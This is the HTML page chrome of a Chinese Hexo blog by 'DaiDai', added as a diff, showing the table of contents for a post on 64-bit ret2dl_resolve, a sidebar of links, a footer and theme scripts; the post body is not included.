+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#64%E4%BD%8Dret2dl-resolve%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">64位ret2dl_resolve一些个人理解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E6%8B%AC"><span class="nav-number">1.2.</span> <span class="nav-text">概括</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.3.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-number">1.5.</span> <span class="nav-text">调试与分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">1.6.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.7.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DaiDai"
+      src="/images/me.jpg">
+  <p class="site-author-name" itemprop="name">DaiDai</p>
+  <div class="site-description" itemprop="description">never stop learning</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://m3wsec.github.io/" title="http:&#x2F;&#x2F;m3wsec.github.io" rel="noopener" target="_blank">m3w</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/qq_46091464" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_46091464" rel="noopener" target="_blank">Firebasky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/erR0Ratao" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;erR0Ratao" rel="noopener" target="_blank">atao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.d1a0.cn/" title="https:&#x2F;&#x2F;www.d1a0.cn&#x2F;" rel="noopener" target="_blank">d1a0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/anweilx/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;anweilx&#x2F;" rel="noopener" target="_blank">anweilx</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.csdn.net/Kroner" title="https:&#x2F;&#x2F;me.csdn.net&#x2F;Kroner" rel="noopener" target="_blank">No</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/Amherstieae" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;Amherstieae" rel="noopener" target="_blank">beta</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.y4tacker.top/" title="http:&#x2F;&#x2F;blog.y4tacker.top" rel="noopener" target="_blank">Y4tacker</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://yq1ng.github.io/" title="http:&#x2F;&#x2F;yq1ng.github.io" rel="noopener" target="_blank">yq1ng</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://snowywar.top/wordpress" title="http:&#x2F;&#x2F;snowywar.top&#x2F;wordpress" rel="noopener" target="_blank">snowy</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.sy4.top/" title="https:&#x2F;&#x2F;www.sy4.top&#x2F;" rel="noopener" target="_blank">picnic</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://justloseit.top/" title="http:&#x2F;&#x2F;justloseit.top&#x2F;" rel="noopener" target="_blank">Joker</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://s0uthwood.github.io/" title="https:&#x2F;&#x2F;s0uthwood.github.io&#x2F;" rel="noopener" target="_blank">s0uthwood</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://kfxp12138.github.io/" title="https:&#x2F;&#x2F;kfxp12138.github.io&#x2F;" rel="noopener" target="_blank">triplewing</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">DaiDai</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">197k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:59</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
